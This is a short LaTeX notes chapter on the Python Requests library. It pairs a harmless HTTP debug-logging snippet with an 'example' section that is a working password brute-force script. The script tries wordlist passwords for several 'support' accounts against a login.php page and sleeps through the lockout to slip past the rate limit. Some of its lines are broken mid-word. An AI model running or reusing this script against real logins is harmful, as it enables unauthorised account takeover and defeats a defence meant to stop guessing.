\chapter{Requests}


\url{https://requests.readthedocs.io/en/latest/}
\section{logging}
\begin{verbatim}
import requests
import http
import logging

# Set up logging to a file
logging.basicConfig(filename="app.log", level=logging.DEBUG)
logger = logging.getLogger(__name__)
http.client.HTTPConnection.debuglevel = 1

# Monkey patch the print() function and redirect it to a
logger.debug() call
def print_to_log(*args):
    logger.debug(" ".join(args))
http.client.print = print_to_log
\end{verbatim}


\section{example}
\begin{verbatim}
import requests
import time
url = "http://{}/login.php".format(ip)
# rate limit blocks for 30 seconds
lock_time = 30
# message that alert us we hit rate limit
lock_message = "Too many login failure"
# read user and password
for username in ["support.cn", "support.gr", "support.it",  "support.us"]:
    with open(userpass_file, "r") as fh:
        for fline in fh:
            if fline.startswith("#"):
                continue
            password = fline.rstrip()
            data = {
                "userid": username,
                "passwd": password,
                "submit": "submit"
            }
    
            #print(" test {} ".format(password))
            # do the request
            res = requests.post(url, headers=headers, data=data)
            #print(res.text)
    
            # handle generic credential error
            if "Invalid credentials" in res.text:
                print("[-] Invalid credentials: userid:{} passwd:{}".format(user
name, password))
            elif lock_message in res.text:
                print("[-] Hit rate limit, sleeping 30")
                # do the actual sleep plus 0.5 to be sure
                time.sleep(lock_time+0.5)
            else:
                print("[+++++++++++] Valid credentials: userid:{} passwd:{}".for
mat(username, password))
                exit()

\end{verbatim}
